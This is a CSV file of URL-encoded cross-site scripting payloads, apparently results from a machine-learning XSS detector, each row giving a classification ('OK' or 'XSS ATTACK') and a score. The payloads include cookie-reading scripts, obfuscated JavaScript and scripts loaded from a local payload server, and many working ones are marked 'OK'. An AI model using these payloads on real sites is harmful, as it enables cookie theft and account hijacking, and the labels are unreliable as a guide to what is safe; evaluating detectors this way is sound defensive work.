sentence,result,threshold
%22%3E%3Cimg/onerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax%20/%3E,OK,0.163133532
%3Cscript%3E%20document.cookie%3D%27X%27%3B%20if%28document.cookie%20%21%3D%3D%20%27X%27%29%20%7B%20alert%281%2Cdocument.cookie%29%3B%20%7D%20%3C/script%3E,OK,0.0597273111
%3CSCRIPT%3E%2Balert%28%22X%22%29%3C/SCRIPT%3E,XSS ATTACK,0.986533105
%22%3E%3Cimg%20src%3Da%20onerror%3Dalert%281%29,OK,0.0310674012
%22%3E%3Ca/href%3D%22javascript%3A%26%2313%3B%20javascript%3Aprompt%281%29%22%3E%3Cinput%20type%3D%22X%22%3E,OK,0.0439339578
%22%3E%3CIMG%20SRC%3D%22javascript%3Aalert%28%27X%27%29%3B%22%3E,XSS ATTACK,0.95277
%27%3E%3Cform%20name%3Dself%20location%3D%22javascript%3Aalert%281%29%22%3E,OK,0.117389113
%27%3E%3Cdiv%20style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A//foo.f/oo%7D%3Bcolor%3Ared/%2A/foo.jpg%29%3B%22%3EX%3C/div%3E,OK,0.00357145071
data%3Atext/html%2C%253Cscript%253Ealert%281%29%253C%252Fscript%253E,OK,0.0260539055
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.474990964
%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%22%27%29%3B%3E,OK,0.00828790665
%27%3E%3Cimg%20src%3Dx%20onerror%3D%5Cx11%22javascript%3Aalert%281%29%22%3E,OK,0.00240901113
%27%3E%3Cxml%20id%3D%22X%22%20src%3D%22%25%28htc%29s%22%3E%3C/xml%3E%20%3Clabel%20dataformatas%3D%22html%22%20datasrc%3D%22%23X%22%20datafld%3D%22payload%22%3E%3C/label%3E,OK,0.00217676163
%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%3Cg%20onload%3D%22javascript%3Aalert%281%29%22%3E%3C/g%3E%3C/svg,OK,0.0142351985
%3Cscript%3Ealert%281%29/X/%27%3C/script%3E,XSS ATTACK,0.979579926
%22%3E%3CIFRAME%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C/IFRAME%3E,XSS ATTACK,0.994178116
%22%3E%3CMETA%20HTTP-EQUIV%3D%22Link%22%20Content%3D%22%3C%25%28css%29s%3E%3B%20REL%3Dstylesheet%22%3E,XSS ATTACK,0.859954119
%27%3E%3Csvg%3E%3Cscript%3Ealert%26%2340/1/%26%2341%3C/script%3E,OK,0.0119189322
%27%3E%3CLAYER%20SRC%3D%22javascript%3Aalert%281%29%3B%22%3E%3C/LAYER%3E,XSS ATTACK,0.997683704
%3C%3F%20foo%3D%22%3E%3Cx%20foo%3D%27%3F%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.00462251902
%3Cimg%20src%3Dx%3Aalert%28alt%29%20onerror%3Deval%28src%29%20alt%3D0%3E,OK,0.00398039818
%22%3E%3C%3Fxml%20version%3D%221.0%22%3F%3E%20x%3E%3Cpayload%3E%3C%21%5BCDATA%5B%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%5D%5D%3E%3C/payload%3E%3C/x%3E,OK,0.00573638082
%27%3E%3C%3F%20echo%28%27%3CSCR%29%27%3Becho%28%27IPT%3Ealert%28%22X%22%29%3C/SCRIPT%3E%27%29%3B%20%3F%3E,OK,0.0801104605
%23%3Fgad%3Dxxxx%22onload%3D%22alert%281%29%22,XSS ATTACK,0.624786794
%22%3E%3Cimg%20src%20onerror%20/%22%20%27%22%3D%20alt%3Djavascript%3Aalert%281%29//%22%3E,OK,0.00209623575
%22%3E%3CIMG%20ONERROR%3D%3FVBS%3AEXECSCRIPT%20LCASE%28%3FALERT%281%29%3F%29%3F%20SRC%3DA%3E,OK,0.385784209
%27%3E%3Cscript/src%3Ddata%3A%2Calert%281%29%3E,XSS ATTACK,0.967137218
%27%3E%3Cscript%3E%28%7Bset/%2A%2A/%24%28%24%29%7B_/%2A%2A/setter%3D%24%2C_%3D1%7D%7D%29.%24%3Dalert%3C/script%3E,OK,0.252824783
%27%3E%3Cbody%20onscroll%3Dprompt%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,OK,0.010666728
%2522%253E%253C%2573%2563%2572%2569%2570%2574%253E%254B%2543%2546%253C%252F%2573%2563%2572%2569%2570%2574%253E,XSS ATTACK,0.674982369
%22%3E%3Ciframe%20src%3Dhttp%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%20%3C,XSS ATTACK,0.674964726
%7Bget%5Balert%601%60%5D%28%29%7B%7D%7D,OK,0.0432426333
%3Ca%20href%3D%22%5Cx1Bjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00345054269
%3CIMG%20SRC%3D%27vbscript%3Amsgbox%281%29%27%3E,XSS ATTACK,0.969021678
%27%3E%3Ca%20href%3D%22%01java%03script%3Aalert%281%29%22%3EX%3Ca%3E,XSS ATTACK,0.432814479
%22%3E%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22X%22%29%27%3B%3C/STYLE%3E,XSS ATTACK,0.999452889
%22%3E%3Cembed%20code%3D%25%28scriptlet%29s%3E%3C/embed%3E,XSS ATTACK,0.755738258
%27%3E%3Csvg%3E%3Cstyle%3E%7Bfont-family%26colon%3B%27%3Ciframe/onload%3Dconfirm%281%29%3E%27,OK,0.00235235691
%3C/ScrIpt%3E%3Cscript%3Ealert%28x.y.x.y.x.y%5B0%5D%29%3Balert%28x.x.x.x.x.x.x.x.x.y.x.y.x.y%5B0%5D%29%3B%3C/script%3E,OK,0.00471949577
this%5B%22docum%22%2B%28%5B%5D%5B%2B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%2B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%7B%7D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%22kie%22%5D,OK,0.00720146298
%22%3E%3Cimg%20type%3Dimage%20src%3DX.gif%20onreadystatechange%3Dalert%281%29%3E,OK,0.00174167752
%3Cimg%20src%3Dx%20onerror%3D%22javascript%3Awindow.onerror%3Dalert%3Bthrow%201%22%3E,OK,0.000766664743
%27%3E%3Ca%20href%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B1%26rpar%3B%22%3EX%3C/a%3E,OK,0.0308056176
%27%3E%3Cmeta%20charset%3D%20%22x-imap4-modified-utf7%22%26%26%3E%26%26%3Cscript%26%26%3Ejavascript%3Aalert%281%29%26%26%3B%26%26%3C%26%26/script%26%26%3E,OK,0.011924088
%22%3E%3Cscript%20/%2A%2500%2A/%3E/%2A%2500%2A/alert%281%29/%2A%2500%2A/%3C/script%20/%2A%2500%2A/,OK,0.0211496651
%22%3E%3Cbody%20onbeforeactivate%3Dalert%281%29%3E,OK,0.316578299
%22%3E%3Cscript%3EObject.__noSuchMethod__%20%3D%20Function%2C%5B%7B%7D%5D%5B0%5D.constructor._%28%27javascript%3Aalert%281%29%27%29%28%29%3C/script%3E,OK,0.0182610452
%3Cscript%20language%3Dvbs%3EexecScript%28%3Falert%281%29%3F%29%3C/script%3E,XSS ATTACK,0.993674695
%22%3E%3Cimg%20src%3Dxx%3Axx%20onerror%3D%22x%3D%27%5C%27%2Calert%281%29//%27%22%3E,OK,0.00465384126
%3Cx%20xmlns%3Aev%3D%22http%3A//www.w3.org/2001/xml-events%22%20ev%3Aevent%3D%22load%22%20ev%3Ahandler%3D%22javascript%3Aalert%281%29//%23x%22/%3E,OK,0.00304654241
%3C/ScrIpt%3E%3Cscript%3Eif%28%22x%5C%5CxE0%5CxB9%5Cx92%22.length%3D%3D2%29%20%7B%20javascript%3Aalert%281%29%3B%7D%3C/script%3E,OK,0.0735497773
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.474990964
%27%3E%3C//%20style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E,XSS ATTACK,0.971373081
this%5B%27document%27%5D%5B%28%7B%7D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%27%5Cx6b%5Cx69%5Cx65%27%5D,OK,0.12133795
%27%3E%3Cimg%20src%3D%20%22a%22%20onerror%3D%20%27eval%28atob%28%22cHJvbXB0KDEpOw%3D%3D%22%29%29%27,OK,0.000748187304
%22%3E%3E%3Cmarquee%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E%3C/marquee%3E%22%20%3E%3C/plaintext%5C%3E%3C/%7C%5C%3E%3Cplaintext/onmouseover%3Dprompt%281%29,XSS ATTACK,0.743128777
%3Cimg%20src%3D%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/gif.gif%27%20onload%3D%27document.scripts%280%29.src%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%27%3E,OK,0.00304052234
%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E,OK,0.0218291581
%3C/ScrIpt%3E%3Cscript%3EReferenceError.prototype.__defineGetter__%28%27name%27%2C%20function%28%29%7Balert%281%29%7D%29%2Cx%3C/script%3E,OK,0.0154432356
%2500%3Cbody%20onload%3Dalert%281%29%3E,OK,0.0685811341
%27%3E%3Cscript%3Evar%20var%20%3D%201%3B%20alert%28var%29%3C/script%3E,XSS ATTACK,0.633751333
%27%3E%3Ciframe/src%3D%22data%3Atext%26sol%3Bhtml%3B%26Tab%3Bbase64%26NewLine%3B%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E,XSS ATTACK,0.973163605
%22%3E%3CIMG%20DYNSRC%3D%22javascript%3Aalert%28%27X%27%29%22%3E,XSS ATTACK,0.98930037
%27%3E%3Ca%20href%3Dx%20onerror%3Dalert%281%29%3E,XSS ATTACK,0.901879191
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
%22%3E%3Cscript%20itworksinallbrowsers%3E/%2A%3Cscript%2A%20%2A/alert%281%29%3C/script%20%3F,OK,0.0139350295
this%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%27%5D%5B%27cookie%27%5D,OK,0.144685686
%22%3E%3Cstyle%3E%3C/style%5Cx0D%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,OK,0.00643983483
%3C/ScrIpt%3E%3Cscript%3Eprompt%28-%5B%5D%29%3C/script%3E,OK,0.155221432
%22%3E%3Cmarquee/onstart%3Dconfirm%281%29%3E,XSS ATTACK,0.984457254
%27%3E%3Cscript%3E%20var%20x%20%3D%20%22asdf%5C1%20asdf%22%3B%20alert%281%29%3B%20%3C/script%3E,XSS ATTACK,0.567029536
%22%3E%3Cimg%20src%3D1%20onerror%22alert%281%29%22%3E,OK,0.0161022246
%22%3E%3Cembed%20type%3D%22image%22%20src%3D%25%28scriptlet%29s%3E%3C/embed%3E,XSS ATTACK,0.809022486
%27%3E%3CTABLE%3E%3CTD%20BACKGROUND%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,XSS ATTACK,0.882647574
%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.859838724
%27-alert%281%29-%27,OK,0.0582238138
this%5B%27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%27%2B%28%5B%5D%5B%2B%5B%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%5B%5D%5B%2B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%27%5Cx63%5Cx6f%5Cx6f%5Cx6b%5Cx69%5Cx65%27%5D,OK,0.00228074193
%27%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%22--%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27IPT%20SRC%3Dhttp%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%3E%3C/SCRIPT%3E%27%22--%3E,XSS ATTACK,0.923133135
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E%3B,XSS ATTACK,0.574644268
%3Cform%3E%3Ciframe%20%26%2309%3B%26%2310%3B%26%2311%3B%20src%3D%22javascript%26%2358%3Balert%281%29%22%26%2311%3B%26%2310%3B%26%2309%3B%3B%3E,OK,0.00348386168
%22%3E%3CTABLE%20BACKGROUND%3D%22javascript%3Aalert%28%27X%27%29%22%3E,XSS ATTACK,0.985456228
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3Cscript%3E%3C/script%3E,OK,0.0793355703
%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert%281%29%3C/script%20%3C/b%3E%3C/b%3E,OK,0.0826716125
%3Cbody%20onload%3D%22%24%7D%29%7D%7D%7D%7D%29%3Balert%281%29%3B%28%7B0%3A%7B0%3A%7B0%3Afunction%28%29%7B0%28%7B%22%3E,OK,0.00779348612
%27%3E%3Cbody%20onscroll%3Dalert%281%29%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cinput%20autofocus%3E,OK,0.0149213076
%22%3E%3Cstyle/onload%3D%26lt%3B%21--%26%2309%3B%26gt%3B%26%2310%3Balert%26%2310%3B%26lpar%3B1%26rpar%3B%3E,XSS ATTACK,0.49149996
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29/X/%27%3C/script%3E,OK,0.170864344
%27%3E%3Ca%20href%3D%22%5Cx07javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0297706425
%3Ca%20href%3D%22%5Cx20javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00439441204
%3CSCRIPT%20a%3D%22%3E%22%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E,OK,0.129864305
%27%3E%3Cimg/onerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax%20/%3E,OK,0.169087708
%27%3E%3Cscript%20itworksinallbrowsers%3E/%2A%3Cscript%2A%20%2A/alert%281%29%3C/script,OK,0.0119666755
%27%3E%3Cform%20name%3Dself%20location%3D%22javascript%3Aalert%281%29%22%3E,OK,0.117389113
%22%3E%3Cimg/src%3D%40%26%2332%3B%26%2313%3B%20onerror%20%3D%20prompt%28%27%26%2349%3B%27%29,OK,0.0057785213
%27%3E%3Cimg%20src%3Dxx%3Axx%20onerror%3Dalert%281%29%3E%20%3Ca%20href%3Djavascript%3Aalert%281%29%3E1%3C/a%3E,OK,0.00216665864
%22%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.200306922
%01%3Coption%3E%3Cstyle%3E%3C/option%3E%3C/select%3E%3Cb%3E%3Cimg%20src%3Dxx%3A%20onerror%3Dalert%281%29%3E%3C/style%3E%3C/option%3E,OK,0.160120726
%27%3E%3Cimg%20onerror%3Da%26%230108ert%281%29%20src%3Da%3E,OK,0.00718170404
%22%3E%3Cbody%20onResize%20body%20onResize%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onResize%3E,XSS ATTACK,0.532967687
%27%3E%3Ca%20href%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Bcookie%26rpar%3B%3EX%3C/a%3E,OK,0.0285233259
%27%3E%3CDIV%20STYLE%3D%22background-image%3A%20url%28%26%231%3Bjavascript%3Aalert%28%27X%27%29%29%22%3E,XSS ATTACK,0.734685242
%26%27%22%3Echr%2860%29.chr%28115%29.chr%2899%29.chr%28114%29.chr%28105%29.chr%28112%29.chr%28116%29.chr%2862%29.chr%2897%29.chr%28108%29.chr%28101%29.chr%28114%29.chr%28116%29.chr%2840%29.chr%2847%29.chr%28120%29.chr%28115%29.chr%28115%29.chr%2847%29.chr%2841%29.chr%2860%29.chr%2847%29.chr%28115%29.chr%2899%29.chr%28114%29.chr%28105%29.chr%28112%29.chr%28116%29.chr%2862%29,OK,0.00109252334
%22%3E%3Cscript/src%3Ddata%26colon%3Btext/j%5Cu0061v%5Cu0061%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%2C%5Cu0061%256C%2565%2572%2574%28/X/%29%3E%3C/script,XSS ATTACK,0.532436
%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A//www.w3.org/1999/xhtml%22%3Ealert%281%29%3B%3C/x%3Ascript%3E,XSS ATTACK,0.770331
%27%3E%3CSCRIPT%20a%3D%22%3E%22%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.936635494
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%22%3E%3Ciframe%20src%3D%22javascript%3Aalert%281%29%3B%20%3C,XSS ATTACK,0.921194851
%3Cvideo%20src%3D1%20onerror%3Dalert%281%29%3E,OK,0.108060092
%3Cisindex%20type%3Dimage%20src%3D1%20onerror%3Dalert%281%29%3E,XSS ATTACK,0.984123826
%22%3E%3Ciframe%20%20src%3Dj%26NewLine%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3Bv%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bs%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bc%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Br%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bi%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bp%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bt%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26colon%3Ba%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bl%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Be%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Br%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bt%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%2528%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B1%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%2529%3E%3C/iframe%3E%20%3F,OK,7.84601469e-14
%3Cimg/onerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax%20/%3E,XSS ATTACK,0.979637
%22%20onclick%3Dalert%281%29//%3Cbutton%20%3F%20onclick%3Dalert%281%29//%3E%20%2A/%20alert%281%29//,OK,0.296658397
%22%3E%3Cimg%20%5Cx11src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0166156
%27%3E%3Cimg%20%5Cx34src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0158817768
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E%22%60%20%60%3E,OK,0.128686696
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%5Cx0A,OK,0.0323728919
%27%3E%3CsVg%3E%3CscRipt%20%2500%3Ealert%26lpar%3B1%26rpar%3B%20%7BOpera%7D,OK,0.00710478425
%3CSCRIPT/SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.998918176
%27%3E%3Cinput%20onblur%3Dwrite%281%29%20autofocus%3E%3Cinput%20autofocus%3E,OK,0.06394279
%26lt%3BA%20HREF%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html./%22%26gt%3BX%26lt%3B/A%26gt%3B,XSS ATTACK,0.562214255
%27%3E%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx89javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0140664876
%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.239136726
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%22%60%20%60%3E,OK,0.0126391649
%27%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.241716564
%27%3E%3Cmarquee/onstart%3Dconfirm%281%29%3E,XSS ATTACK,0.984748721
%3Cscript%5Cx0Atype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,XSS ATTACK,0.64729619
%3E%3Cscript%3E1%3C%5C%5C/script%3E,XSS ATTACK,0.938005
%27%3E%3CIMG%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.948984742
%3F%3Balert%281%29//,OK,0.079418242
%27%3E%3Cbody%20onscroll%3Dalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,OK,0.0103112161
%26lt%3BIMG%20LOWSRC%3D%22javascript%3Aalert%281%29%22%26gt%3B,OK,0.0314763784
%27%3E%3Cform%20action%3D%27data%3Atext%26sol%3Bhtml%2C%26lt%3Bscript%26gt%3Balert%281%29%26lt/script%26gt%27%3E%3Cbutton%3ECLICK,OK,0.00365278125
%27%3E%3Ca%20href%3D%22javascript%5Cx0D%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0830692649
%22%3E%3CSCRIPT%3Ea%3D/X/,XSS ATTACK,0.895100951
%3Ca%20href%3D%22javascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%26lpar%3B1%26rpar%3B%22%3E%3Cbutton%3E,OK,0.0153698921
%27%3E%3Cobject%20allowscriptaccess%3D%22always%22%20data%3D%22test.swf%22%3E%3C/object%3E,OK,0.0125645101
%22%3E%3Cobject%20type%3D%22text/x-scriptlet%22%20data%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%3E%3C/object%3E,XSS ATTACK,0.472404361
%3CIMG%20SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.989735484
%22%3E%3Cimg%20onerror%3Da%26%230108ert%281%29%20src%3Da%3E,OK,0.00712484121
%22%3E%3Cdiv%20style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EX,OK,0.0103582144
X%3Cdiv%20style%3D%22x%3Aexpression%28alert%281%29%29%22%3EX,OK,0.00873974
%22%3E%3CIMG%20SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.989934325
%3Cform%20id%3Dtest%20onforminput%3Dprompt%281%29%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form%3Dtest%20onformchange%3Dprompt%282%29%3EX%3C/button%3E,OK,0.00212523341
onload%20%3Dalert%281%29%20id%3D%22a,XSS ATTACK,0.912867904
%22%3E%3Ctitle%20onpropertychange%3Djavascript%3Aalert%281%29%3E%3C/title%3E%3Ctitle%20title%3D%3E,OK,0.00567895174
%3Cframeset%20onload%3Djavascript%3Aalert%281%29%3E,XSS ATTACK,0.986706257
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%3CBASE%20HREF%3D%22javascript%3Ajavascript%3Aalert%281%29%3B//%22%3E,XSS ATTACK,0.960546
%3Csvg%3E%3Cscript%3Evarmyvar%3D%22text%26quot%3B%3Balert%281%29//%22%3B%3C/script%3E%3C/svg%3E,OK,0.00320839882
%22%3E%3Cimg/src%3D%221%22/onerror%3D%22alert%281%29%22,OK,0.268013954
%27%3E%3Cimg%20onerror%3D%3Falert%281%29%3Fsrc%3Da%3E,OK,0.0238580406
%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.239136726
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%27%3E%3CA%20HREF%3D%22htt%09p%3A//6%096.000146.0x7.147/%22%3EX%3C/A%3E,XSS ATTACK,0.999423504
%3CSCRIPT%20FOR%3Ddocument%20EVENT%3Donreadystatechange%3Eprompt%281%29%3C/SCRIPT%3E,XSS ATTACK,0.918253422
%22%3E%3Csvg%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%3E%3Ca%3E%3Ccircle%20r%3D100%20/%3E%3Canimate%20attributeName%3D%22xlink%3Ahref%22%20values%3D%22%3Bjavascript%3Aalert%281%29%22%20begin%3D%220s%22%20dur%3D%220.1s%22%20fill%3D%22freeze%22/%3E,OK,0.000230759382
